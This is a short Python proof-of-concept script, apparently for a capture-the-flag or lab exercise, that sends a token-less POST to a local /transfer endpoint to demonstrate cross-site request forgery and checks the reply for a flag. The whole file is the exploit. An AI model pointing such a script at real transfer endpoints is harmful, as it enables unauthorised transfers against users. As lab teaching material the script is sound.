import argparse
import json
import sys

import requests

DEFAULT_AMOUNT = 250


def exploit(base_url: str, amount: int = DEFAULT_AMOUNT) -> bool:
    resp = requests.post(
        f"{base_url}/transfer",
        data={"amount": str(amount)},
        timeout=5,
    )
    resp.raise_for_status()
    data = resp.json()
    print(json.dumps(data, indent=2))
    flag = data.get("flag", "")
    return bool(flag and flag.startswith("FLAG"))


def main() -> None:
    parser = argparse.ArgumentParser(description="CSRF PoC without tokens")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--amount", type=int, default=DEFAULT_AMOUNT)
    args = parser.parse_args()
    success = exploit(args.base_url, args.amount)
    if success:
        print("CSRF SUCCESS")
    else:
        print("CSRF FAILED")
        sys.exit(1)


if __name__ == "__main__":
    main()

